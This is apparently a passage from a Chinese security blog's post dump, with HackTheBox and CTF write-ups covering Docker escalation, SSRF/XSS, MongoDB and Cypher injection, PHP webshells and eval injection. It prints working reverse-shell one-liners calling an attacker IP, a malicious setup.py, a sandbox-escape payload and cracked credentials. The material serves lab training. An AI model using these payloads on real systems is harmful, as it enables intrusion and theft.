看到上面有mysql命令，而且admin和guest用户都在user_auth表里，那么执行如下命令 mysql --host=db --user=root --password=root cacti -e \"SELECT * FROM user_auth\" 发现有另一个用户marcus，密码是hash存储，那就用john爆破一下 将hash保存到新文件hash里，执行如下命令，得到密码 john --wordlist=/usr/share/wordlists/rockyou.txt hash marcus:funkymonkey ssh连接 从本地下载linpeas 本地kali执行 python3 -m http.server 80 目标靶机执行 cd /tmp wget http://10.10.14.4/linpeas.sh chmod +x linpeas.sh ./linpeas.sh 发现有邮件 查看邮件 cat /var/mail/marcus 四、CVE-2021-41091（docker目录遍历&amp;命令执行）可看到有三个CVE，依次google查找利用方式，找到如下exploit，是docker容器的漏洞 https://github.com/UncleJ4ck/CVE-2021-41091 大致原理是，因为权限控制不当，当docker容器内存在带有suid的程序，我们可以在主机遍历到这个docker容器的目录，然后执行这些带suid的程序，相当于也在主机中执行了这些带suid的程序 需要先在之前的root窗口给/bin/bash添加suid权限 然后将exploit下载到本地，然后在目标靶机从本地下载exp.sh，执行如下命令 wget http://10.10.14.4/exp.sh chmod +x exp.sh ./exp.sh 再进入到容器目录（在执行结果的Current Vulnerable Path处），执行./bin/bash -p 成功获取root权限","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"2021祥云杯-cralwer_z","slug":"CTF10-2021祥云杯-cralwer_z","date":"2023-09-05T11:00:00.000Z","updated":"2023-09-26T02:35:51.521Z","comments":true,"path":"posts/9a2f1a58.html","link":"","permalink":"https://wa0er.github.io/posts/9a2f1a58.html","excerpt":"","text":"2021祥云杯-cralwer_z知识点概要：js代码审计 首页 随便注册个用户登录进去（笔者此处注册admin），在Profile页面可以更新个人信息 有源码，源码结构： 源码分析源码中的findByPK()和findOne()是Sequelize API，效果可以类比数据库查询 具体参考：https://sequelize.org/docs/v6/core-concepts/model-querying-finders/ 首先server.js规定了用户路由从/user开始 /routes/index.js是常规的首页注册、登录、登出功能 /routes/user.js有几个关键路由 /user/profile路由，分为三部分 1.要求传入参数affiliation、age、bucket不为空且是字符串，其中checkBucket()要求bucket协议是http:或https:，且url包含oss-cn-beijing.ichunqiu.com字符串（代码在第二张图）； 2.把传入的affiliation、age、bucket参数值更新到数据库（bucket赋值给personalBucket），并生成一个token； 3.正则匹配bucket，若符合正则，则用上一步生成的token跳转访问/user/verify路由，反之则返回提示； /user/verify路由 验证token，验证成功则更新数据库中用户的bucket（personalBucket赋值给bucket） /user/bucket路由 这里的正则跟/user/profile的正则是一样的，但是可以看到，此处else有一个对用户bucket的请求，肯定是利用点，要想利用bucket，那就要清楚bucket怎么控制，bucket传递路线如下 /user/profile传入bucket参数→数据库赋值给personalBucket→/user/verify再把personalBucket赋值给bucket 相当于在数据库兜了一圈，想请求bucket，就必须经过/user/verify，那么/user/profile的正则就必须匹配成功，那么/user/bucket的正则也会同步匹配成功，那么就没法请求bucket。 所以明确目标：让/user/profile正则匹配成功，同时/user/bucket正则匹配失败，最终的bucket还要是我们自己的URL 此时看/user/profile，可以发现，它的逻辑是先更新bucket，再正则匹配，然后再重定向到/user/verify， 且checkBucket()没有正则那么严格，只检查协议和oss-cn-beijing.ichunqiu.com字符串 那么我们可以发送两次数据包，第一次传正常的bucket，重定向之前，第二次传伪造的bucket，格式如下，然后让第一个请求继续重定向，再访问/user/bucket路由，即可进到else，从而对伪造的bucket发起请求 http%3A%2F%2Fxx.xx.xx.xx/index.html?oss-cn-beijing.ichunqiu.com%2F xx.xx.xx.xx是自己的vps，上述操作之前先在vps建一个index.html，代码如下，然后开启http服务 &lt;script&gt; a=this.constructor.constructor.constructor.constructor('return process')(); b=a.mainModule.require('child_process'); c=b.execSync('cat /flag').toString(); document.write(c); &lt;/script&gt; 实际操作先在vps建一个index.html，然后开启http服务 题目正常注册，登录，然后抓取/user/profile的数据包，发送到Repeater两份，第一份正常发送 第二份修改bucket后发送，响应包也可看到绕过/user/profile正则的提示 然后回到第一份，点击左上角Send那一行的Follow Redirection，成功更新bucket URL访问/user/bucket，获取flag 也可反弹shell，若用这个，可用screen命令在vps开两个窗口，一个开启http服务，一个监听反弹shell端口 &lt;script&gt; c='constructor';this[c][c](\"c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/9898 0&gt;&amp;1'],);console.log(ls.output.toString());\")() &lt;/script&gt; 回头看，问题在于checkBucket()不够严格，只检查协议和oss-cn-beijing.ichunqiu.com字符串 避免漏洞的思路：/user/profile中checkBucket()用正则的逻辑；或者先正则匹配，再更新bucket 参考https://blog.csdn.net/RABCDXB/article/details/124189883 https://blog.csdn.net/cjdgg/article/details/120147572","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"2021祥云杯-secrets_of_admin","slug":"CTF9-2021祥云杯-secrets_of_admin","date":"2023-09-02T11:00:00.000Z","updated":"2023-09-26T02:26:08.113Z","comments":true,"path":"posts/27ec25c5.html","link":"","permalink":"https://wa0er.github.io/posts/27ec25c5.html","excerpt":"","text":"2021祥云杯-secrets_of_admin知识点概要：审计、XSS+SSRF组合拳 首页 有源码，源码结构： 在database.ts文件里有admin账户密码，可以直接登录。另外可以看出有users和files两个表，还有一个superuser用户 登录之后进入/admin目录，在文本框随便输入，会提示，大致意思是保存成了pdf文件，但是需要知道怎么下载 源码分析审计index.ts，几个关键路由 根目录，做登录验证，登录成功设置cookie，并重定向到/admin目录 /admin目录 1.POST提交content参数值，会有几个类似XSS的黑名单过滤； 2.将content直接拼接到一段HTML代码标签里； 3.将HTML代码写入pdf文件，pdf以uuid()的值命名，存在./files/路径下； 4.用文件名计算checksum值，将superuser、文件名、checksum值一块存入数据库。 /api/files目录 1.正则匹配请求地址的socket（IP:PORT），要求冒号前（即IP地址）只能是127.0.0.1； 2.GET参数：username、filename、checksum只能是字符串类型，会被存储到数据库 /api/files/:id目录 1.token的username不能是superuser； 2.token的username和请求参数id会被用来查找数据库文件名； 3.全场唯一读文件函数readFile读取../files/路径下的对应文件。 数据库getFile()操作代码如下，可以看到传入的参数id对应checksum，从files表中查找对应的文件名 捋一下思路 1.读文件需要token的username是admin，并且知道文件对应的checksum值； 2.要保证token的username是admin，只需正常登录admin账户就可以； 3.文件对应的checksum值则有两条路线，一条是/admin路由的uuid()生成的文件名计算所得，这不可控，另一条是通过/api/files路由的GET参数传入。并且从最初的database.ts可以看到，flag文件属于superuser用户，所以这里也需要通过/api/files路由传入一条username=admin&amp;filename=flag的数据，那么checksum就可以随意设置； 4.又因为/api/files路由只能通过127.0.0.1访问，所以必须通过/admin路由的XSS来构造SSRF请求； 5./admin路由的XSS过滤只是对content参数过滤，所以只需以content数组的形式传入即可绕过。 综上，目标：以admin登录，/admin路由POST传入payload，/api/files/:id访问 Payload如下 content[]=&lt;img+src%3D\"http%3A//127.0.0.1:8888/api/files?username%3Dadmin%26filename%3D./flag%26checksum%3D999\"&gt; 或 content[]=%3Cscript%3E%0Avar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bxhr.open(%22GET%22%2C%20%22http%3A%2F%2F127.0.0.1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D.%2Fflag%26checksum%3D999%22%2C%20true)%3Bxhr.send()%3B%0A%3C%2Fscript%3E 再访问/api/files/999，就会把文件下载下来，打开即可看到flag 注：这里端口用8888是因为app.ts文件中设置路由监听端口是8888 参考https://err0r.top/article/2021xyb/ https://blog.csdn.net/cjdgg/article/details/120238587","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-OnlyForYou","slug":"HTB15-OnlyForYou-Medium","date":"2023-08-31T11:00:00.000Z","updated":"2023-08-31T08:07:03.823Z","comments":true,"path":"posts/5cae8651.html","link":"","permalink":"https://wa0er.github.io/posts/5cae8651.html","excerpt":"","text":"HTB-OnlyForYou一、思路概要1.信息收集找到域名和子域； 2.子域源码审计路由发现LFI； 3.LFI读取Nginx配置文件及主站源码； 4.主站源码审计发现RCE； 5.RCE反弹shell获取www-data权限； 6.查看端口服务发现Neo4j服务； 7.Neo4j注入获得ssh账户密码； 8.pip download代码执行实现suid提权。 二、信息收集nmap扫描端口服务 发现域名，写入本地hosts文件 echo \"10.10.11.210 only4you.htb\" &gt;&gt; /etc/hosts 浏览器打开，首页如下 扫描子域 gobuster vhost -u http://only4you.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 发现一个子域，添加进本地hosts文件 echo \"10.10.11.210 beta.only4you.htb\" &gt;&gt; /etc/hosts 访问子域 三、LFI（本地文件包含）点击Source Code，会下载源码。审计发现app.py的/download路由，if条件用绝对路径即可绕过，POST提交的image参数最终传递给send_file()函数，实现LFI，只需知道文件绝对路径，即可读取任意文件 nmap扫描结果可看出是Nginx服务，尝试读取Nginx相关配置文件 Nginx主配置文件默认路径： /etc/nginx/nginx.conf 虚拟主机默认配置文件： /etc/nginx/sites-available/default /etc/nginx/sites-enabled/default Burp抓包，POST访问/download目录，提交image参数，然后在虚拟主机配置文件发现web目录是/var/www/only4you.htb/（主站）和/var/www/beta.only4you.htb/（子域） 子域下源码有app.py，以经验来看，通常主站下应该也有app.py，尝试读取确实存在 /var/www/only4you.htb/app.py 完整代码如下 from flask import Flask, render_template, request, flash, redirect from form import sendmessage import uuid app = Flask(__name__) app.secret_key = uuid.uuid4().hex @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': email = request.form['email'] subject = request.form['subject'] message = request.form['message'] ip = request.remote_addr status = sendmessage(email, subject, message, ip) if status == 0: flash('Something went wrong!', 'danger') elif status == 1: flash('You are not authorized!', 'danger') else: flash('Your message was successfuly sent! We will reply as soon as possible.', 'success') return redirect('/#contact') else: return render_template('index.html') @app.errorhandler(404) def page_not_found(error): return render_template('404.html'), 404 @app.errorhandler(500) def server_errorerror(error): return render_template('500.html'), 500 @app.errorhandler(400) def bad_request(error): return render_template('400.html'), 400 @app.errorhandler(405) def method_not_allowed(error): return render_template('405.html'), 405 if __name__ == '__main__': app.run(host='127.0.0.1', port=80, debug=False) 上面代码第二行从form模块导入了sendmessage方法，form不是python官方模块，所以猜测在同目录下有form.py，读取如下文件确实存在 /var/www/only4you.htb/form.py 完整代码如下 import smtplib, re from email.message import EmailMessage from subprocess import PIPE, run import ipaddress def issecure(email, ip): if not re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email): return 0 else: domain = email.split(\"@\", 1)[1] result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') if \"v=spf1\" not in output: return 1 else: domains = [] ips = [] if \"include:\" in output: dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\") dms.pop(0) for domain in dms: domains.append(domain) while True: for domain in domains: result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') if \"include:\" in output: dms = ''.join(re.findall(r\"include:.*\\.[A-Z|a-z]{2,}\", output)).split(\"include:\") domains.clear() for domain in dms: domains.append(domain) elif \"ip4:\" in output: ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\") ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: pass break elif \"ip4\" in output: ipaddresses = ''.join(re.findall(r\"ip4:+[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+[/]?[0-9]{2}\", output)).split(\"ip4:\") ipaddresses.pop(0) for i in ipaddresses: ips.append(i) else: return 1 for i in ips: if ip == i: return 2 elif ipaddress.ip_address(ip) in ipaddress.ip_network(i): return 2 else: return 1 def sendmessage(email, subject, message, ip): status = issecure(email, ip) if status == 2: msg = EmailMessage() msg['From'] = f'{email}' msg['To'] = 'info@only4you.htb' msg['Subject'] = f'{subject}' msg['Message'] = f'{message}' smtp = smtplib.SMTP(host='localhost', port=25) smtp.send_message(msg) smtp.quit() return status elif status == 1: return status else: return status 四、RCE反弹shell存在漏洞的代码如下 if not re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})\", email): return 0 else: domain = email.split(\"@\", 1)[1] result = run([f\"dig txt {domain}\"], shell=True, stdout=PIPE) output = result.stdout.decode('utf-8') 原因： 1.因为re.match()是从头开始匹配； 2.且此if条件的正则没有指定匹配结尾的元字符”$”； 3.从而导致只要字符串前半部分有符合邮箱规则的子串，就匹配成功，执行else； 4.那么email是wa0er@htb.com;curl 127.0.0.1，就会导致domain拼接到dig命令时变成如下，从而执行命令 dig txt htb.com;curl 127.0.0.1 修补思路： 1.更换re.match()为re.fullmatch() re.fullmatch(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(.[A-Z|a-z]{2,})\", email) 2.正则添加匹配结尾的元字符\"$\" re.match(\"([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\\.[A-Z|a-z]{2,})$\", email) 看刚才的app.py，form模块的sendmessage方法在16行被调用，也就是在根目录路由被调用，对比代码中接收的POST参数（email, subject, message），在首页顶部菜单栏对应Contact功能点 随便填，抓包 由于会连续执行两个命令（dig和自己的），第二个命令执行结果看不到，所以通过访问本地http服务来测试。需要先本地开启http服务，然后请求包修改如下发送 查看http服务，成功接收到访问请求 于是反弹shell 本地两个终端窗口，一个开启http服务，一个开启监听 python3 -m http.server 80 nc -lvnp 9898 本地新建一个shell.sh文件，内容如下 bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1 然后请求包payload修改如下，发送请求 curl 10.10.14.7/shell.sh|bash 反弹shell成功，获取www-data权限 五、端口转发然后查看端口服务 80（http）、53（dns）、22（ssh）、3306（mysql）、33060（mysql）都是常规端口 7474、7687分别是neo4j数据库服务的http端口和bolt连接器端口 3000、8001非常规端口，应该有web服务，尝试端口转发把流量代理出来 目标靶机执行如下命令从本地下载chisel（笔者此处下载到/tmp目录） wget http://10.10.14.7/chisel chmod +x chisel 本地kali执行如下命令，开启服务端监听 ./chisel server -p 9899 -reverse 目标靶机执行如下命令，实现端口转发 ./chisel client 10.10.14.7:9899 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 本地kali显示如下，连接建立成功 3000端口，看样子是个git仓库托管服务 8001端口 弱口令admin: admin登录成功，下拉发现数据库正是neo4j 六、Neo4j注入参考：https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j neo4j原理参考：https://www.w3cschool.cn/neo4j/neo4j_building_blocks.html 页面左侧菜单栏EMPLOYEES选项中有个输入框，输入如下payload，获取服务版本 ' OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.7/?version=' + version + '&amp;name=' + name + '&amp;edition=' + edition as l RETURN 0 as _0 // 本地http服务可看到回显得到neo4j的服务版本信息 在输入框输入，通过burp传参的话需要经过URL编码且空格需用加号替换 获取label，得到user和employee两个label ' OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.7/?label='+label as l RETURN 0 as _0 // 获取user的properties of a key，得到admin和john两个用户的username和password（有些英文名词怕翻译词不达意，就没用中文） ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.7/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // 用https://crackstation.net/破解hash值，如下 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 admin a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 ThisIs4You ssh连接john账户 执行sudo -l查看能以root身份执行的命令，可从3000端口服务下载后缀为.tar.gz的压缩包 七、pip download代码执行google搜索关键字：pip download exploit https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/ https://github.com/wunderwuzzi23/this_is_fine_wuzzi 下载exploit git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi 修改setup.py两个位置，如下图 from setuptools import setup, find_packages from setuptools.command.install import install from setuptools.command.egg_info import egg_info import os def RunCommand(): os.system(\"chmod u+s /bin/bash\") class RunEggInfoCommand(egg_info): def run(self): RunCommand() egg_info.run(self) class RunInstallCommand(install): def run(self): RunCommand() install.run(self) setup( name = \"this_is_fine_wuzzi\", version = \"0.0.1\", license = \"MIT\", packages=find_packages(), cmdclass={ 'install' : RunInstallCommand, 'egg_info': RunEggInfoCommand }, ) 用如下命令在this_is_fine_wuzzi目录下构建python发布包，笔者此处在virtualenv（python3.8.10虚拟环境）下build，因为正常build会报错 python3 -m build build完成后会在当前目录生成dist目录，里面有个.tar.gz文件 用john的账户密码ThisIs4You登录3000端口web端 右上角加号新建仓库，配置如下 新建仓库成功后进入如下界面，点击Upload File上传文件 上传刚刚生成的.tar.gz文件 上传成功如下 然后在目标靶机执行如下命令，可看到/bin/bash已经有了suid权限 sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/wa0er/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz 执行bash -p提权，成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"2021祥云杯-PackageManager","slug":"CTF8-2021祥云杯-PackageManager","date":"2023-08-29T11:00:00.000Z","updated":"2023-09-26T02:26:08.114Z","comments":true,"path":"posts/f7c9127f.html","link":"","permalink":"https://wa0er.github.io/posts/f7c9127f.html","excerpt":"","text":"2021祥云杯-PackageManager知识点概要：MongoDB盲注 首页 题目源码结构： 后缀.ts是TypeScript语言 从init_db.ts导入mongoose模块看出是MongoDB数据库，且flag被初始化在admin用户的数据库信息里 看如下路由文件routes/index.ts和checkmd5Regex()函数代码，/auth路由token可控，存在注入 原因有二： 1.if (checkmd5Regex(token))中checkmd5Regex()函数的正则可以轻松绕过，使得if判断恒为真； 2.${token.toString()}被直接拼接到查询语句中 思路一构造token aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"||this.password[0]==\"a 使得查询条件如下，此时只需this.password[0]==\"a\"为真，就为真 this.username == \"admin\" &amp;&amp; hex_md5(this.password) == \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"||this.password[0]==\"a\" 那么依次类推，可以判断password的每一位字符，也就是盲注思想，根据请求包写脚本 访问/auth路由页面 Token文本框随便填入test提交，抓包 请求包构造主要就是Cookie和POST数据 为了判断字符匹配正确时的响应包特征，可以先Burp爆破一位出来 可看到，字符正确时，响应页面有特征字符串Found. Redirecting to 综上，脚本如下 import requests import string url=\"http://ef3a4031-fb8f-4859-bd29-256b01ff55ce.node4.buuoj.cn:81/auth\" headers={ \"Cookie\": \"session=s%3AUOifhSNPicItpLjF9bQgYM9roPiXrAED.q%2Frul3zuUNV0sCp0Zu5s1UH68ubuay957RQHuEWqFlc\" } flag = '' for i in range(32): print(i) for j in string.printable: data={ \"_csrf\": \"LEuV2E4F-7JN0Tv4LSue5dLosO0Stdu-SvQA\", \"token\": 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"||this.password[{}]==\"{}'.format(i,j) } r = requests.post(url=url, data=data, headers=headers, allow_redirects=False) if \"Found. Redirecting to\" in r.text: flag = flag+j print(flag) break 运行结果 登录即可看到flag 思路二利用js的抛出异常和IIFE（立即调用函数表达式）来实现 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"||(()=&gt;{throw Error(this.password)})()==\" 拼接到查询条件如下 this.username == \"admin\" &amp;&amp; hex_md5(this.password) == \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"||(()=&gt;{throw Error(this.password)})()==\"\" 解释： (()=&gt;{...}) 定义了一个匿名箭头函数 {throw Error(this.password)} 函数体中使用throw Error抛出错误，并将password作为错误消息 () 表示立即执行这个匿名函数 执行结果如下 参考https://blog.csdn.net/RABCDXB/article/details/124810618 https://cloud.tencent.com/developer/article/2070199","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HTB-TwoMillion","slug":"HTB14-TwoMillion-Easy","date":"2023-08-28T11:00:00.000Z","updated":"2023-08-31T08:07:03.823Z","comments":true,"path":"posts/feb24f25.html","link":"","permalink":"https://wa0er.github.io/posts/feb24f25.html","excerpt":"","text":"HTB-TwoMillion一、思路概要1.主站邀请码注册功能页面js文件发现可用API； 2.通过API获得邀请码注册用户并登录； 3.发现admin认证的API泄露； 4.通过API实现越权，并且发现命令执行漏洞； 5.命令执行反弹shell获取www-data权限； 6.邮件信息泄露，用CVE-2023-0386（OverlayFS提权）获取root权限。 二、信息收集nmap扫描 端口很简单，但得到一个域名，域名写入本地hosts文件 echo \"10.10.11.221 2million.htb\" &gt;&gt; /etc/hosts 浏览器访问 下滑，有个如下join的界面 点击Join HTB，进入如下界面，需要输入邀请码 查看页面源码，发现验证码正确后会跳转到/register 直接访问/register，访问成功，但是没有邀请码还是无法注册 刚刚邀请码页面的源码有个/js/inviteapi.min.js文件，用https://beautifier.io/格式化得到如下代码 有两个API，curl访问2million.htb/api/v1/invite/how/to/generate 有一段data是ROT13编码，转换如下 Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr ROT13转换后： In order to generate the invite code, make a POST request to /api/v1/invite/generate 又得到一个API，看API名字像是生成邀请码，curl访问2million.htb/api/v1/invite/generate 有一段像base64的编码，解码如下，得到邀请码 ┌──(root💀kali)-[~/Desktop] └─# echo \"MVRJVE0tUkxGVFktVzFDT1AtQ0RCOVQ=\" | base64 -d 1TITM-RLFTY-W1COP-CDB9T 返回输入邀请码的界面/invite，输入邀请码后注册用户 注册成功后会跳转到登录页面，登录进入如下界面 在左侧Labs→Access界面，如下 审查元素，看到有API 浏览器访问/api目录，看有没有API泄露，看到/api/v1 再访问/api/v1，泄露了API 三、API越权user的就不管了，直接尝试访问admin的API，GET访问/api/v1/admin/auth，返回false GET /api/v1/admin/auth POST访问/api/v1/admin/vpn/generate，返回401未认证响应码 POST /api/v1/admin/vpn/generate PUT访问/api/v1/admin/settings/update，返回Invalid content type PUT /api/v1/admin/settings/update 那就修改请求包Content-Type字段值为json格式再次访问，提示没有email参数 在请求包数据部分用json格式设置email参数再次访问，提示没有is_admin参数 再设置is_admin参数，又提示is_admin参数需要是0或1 设置is_admin参数值为1，注意不能用引号，又提示email没找到 设置email为刚注册的eamil，返回用户数据，应该是认证成功了 再GET访问/api/v1/admin/auth，message变为true 再POST访问/api/v1/admin/vpn/generate，依旧是按照响应包提示，修改请求包的Content-Type字段和数据部分，得到如下响应，生成了vpn连接的凭据，然后发现这个位置有个命令执行，username字段值应该是直接被拼接到linux的shell命令中了，类似于generate_vpn.sh [username] 四、命令执行修改请求中的username字段值如下，注意命令和注释符#之间需要有个空格，执行命令成功 于是用如下请求数据反弹shell {\"username\":\"wa0er;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1' #\"} 本地监听，成功反弹 在当前目录的环境变量文件.env找到admin用户密码 DB_USERNAME=admin DB_PASSWORD=SuperDuperPass123 尝试发现，既可shell登录，也可ssh登录 shell登录 ssh登录 ssh admin@10.10.11.221 ssh登录发现有个提示You have mail，用find / -name 'mail' 2&gt;/dev/null查找名字为mail的文件或目录，然后在/var/mail/admin文件中找到一封邮件 提示有Linux内核的CVE，关键词OverlayFS / FUSE 五、CVE-2023-0386（OverlayFS提权）google搜索关键字：OverlayFS / FUSE exploit 漏洞分析：https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/ exploit：https://github.com/xkaneiki/CVE-2023-0386/ 本地下载exploit，然后用wget传到目标靶机 本地开启http服务 python3 -m http.server 80 目标靶机下载、解压、编译、执行 cd /tmp wget http://10.10.14.7/CVE-2023-0386-main.zip unzip CVE-2023-0386-main.zip cd CVE-2023-0386-main make all #编译有报错，不影响 ./fuse ./ovlcap/lower ./gc 另开一个终端连接ssh，到/tmp/CVE-2023-0386-main目录下执行./exp，成功获取root权限 Over！","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HXBCTF2021-easywill","slug":"CTF7-HXBCTF2021-easywill","date":"2023-08-25T11:00:00.000Z","updated":"2023-09-26T02:26:08.112Z","comments":true,"path":"posts/291555d9.html","link":"","permalink":"https://wa0er.github.io/posts/291555d9.html","excerpt":"","text":"HXBCTF2021-easywill知识点概要：变量覆盖、文件包含、利用pearcmd.php写shell（不出网） 首页 官网没有对应版本，遂找作者要了一份 感谢框架作者无念和他的热情帮助 本地调试把app/controller/IndexController.php修改为题目的代码，有两个GET参数，那么我们就如下传参调试 ?name=testname&amp;value=testvalue 从第6行传参进入 跳转到willphp/helper.php206行 然后来到willphp/wiphp/View.php14行，可看到执行完毕后，_vars数组里存储了一个键值对，键和值分别对应GET请求传入的name参数值和value参数值 然后返回IndexController.php执行第7行 进入view()函数，来到willphp/helper.php215行 进入fetch方法，来到willphp/wiphp/View.php，16-38行相当于把待渲染的文件路径拼接处理出来 进入39行render方法，来到willphp/wiphp/Tple.php的14-16行 进入renderTo方法，关键在于44-45行，可利用变量覆盖实现文件包含 GET传入如下参数时，执行extract($_vars);后，cfilevalue会覆盖掉$cfile原来的值，如下图 ?name=cfile&amp;value=cfilevalue 比如在题目中传入?name=cfile&amp;value=/etc/passwd，就会返回如下内容 那么就可以通过包含pearcmd.php实现getshell 参考：https://blog.csdn.net/rfrder/article/details/121042290 由于环境不出网，Payload： ?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/wa0er.php+-d+man_dir=&lt;?eval($_REQUEST[0]);?&gt;+-s+ 需Burp传参，否则尖括号会被URL编码写入文件，导致无法解析成php脚本执行 然后POST传参读取flag ?name=cfile&amp;value=/tmp/wa0er.php 0=system('cat /fl*'); 参考https://blog.csdn.net/weixin_46081055/article/details/124046525 https://blog.csdn.net/weixin_43610673/article/details/121369384","categories":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://wa0er.github.io/tags/CTF/"}],"author":"wa0er"},{"title":"HFCTF2021Quals-Unsetme","slug":"CTF6-HFCTF2021Quals-Unsetme","date":"2023-08-21T11:00:00.000Z","updated":"2023-09-26T02:26:08.111Z","comments":true,"path":"posts/d89784ec.html","link":"","permalink":"https://wa0er.github.io/posts/d89784ec.html","excerpt":"","text":"HFCTF2021Quals-Unsetme知识点概要：命令执行 首页 源码逻辑分析： 引入base.php启动框架,并将框架实例赋值给$f3。 设置框架的DEBUG模式为启用。 检查PCRE(Perl兼容正则表达式)的版本是否低于8.0,如果低于则抛出错误。 使用highlight_file()函数高亮显示当前文件内容。 获取GET参数a的值,赋值给$a。 使用unset()删除框架实例$f3上的属性$a。 运行框架。 下面还有三处报错，涉及两个文件：index.php和base.php，应该是一条控制流 FatFree框架：https://github.com/bcosca/fatfree 本地调试1.下载官方源码（笔者调试版本是fatfree-3.7.3） 2.在源码根目录（即index.php同级目录），新建一个test.php，把题目源码复制进去 3.开启调试环境，浏览器访问test.php 因为可控参数为GET参数a，所以调试的时候重点关注此参数的流向 （1）什么参数都不传递的情况下 控制流会从test.php的12行unset()函数进入base.php的__unset()魔术方法 然后进入offsetunset()方法 进入clear()后，会一路执行到530行 执行eval('unset('.$val.');');时，跳转到2337行，执行完2338行，web端返回如题目首页的错误 （2）GET传参?a=1时，前面的控制流路线和无参时是一样的，只不过执行eval('unset('.$val.');');时，会跳转到如下位置 从上述分析可见，eval()函数是危险函数，又因为变量$val是@hive拼接$key经过compile()方法处理得到，$key是从GET参数a一路传递过来的，可控，所以就有了执行命令的机会。关键在于compile()做了什么处理，跟踪关键代码如下 这段代码功能相当于把@hive string $a替换成$hive['string']，又由于$val变量赋值的最外层正则会将$hive替换为$this-&gt;hive，所以相当于传进GET参数a=string，得到$var=$this-&gt;hive['string'] 可以在eval()之前添加echo调试一下： echo '&lt;br&gt;'.$val.'&lt;br&gt;'; echo 'unset('.$val.');'; 传参?a=test，结果如下 传参?a=test%0a);phpinfo(，结果如下 所以，读flag可用如下payload ?a=test%0a);echo file_get_contents(%27/flag%27 ?a=test%0a);readfile(%27/flag%27 ?a=test%0a);system(%27cat%20/flag%27 参考https://www.plasf.cn/articles/hfctfunsetme.html 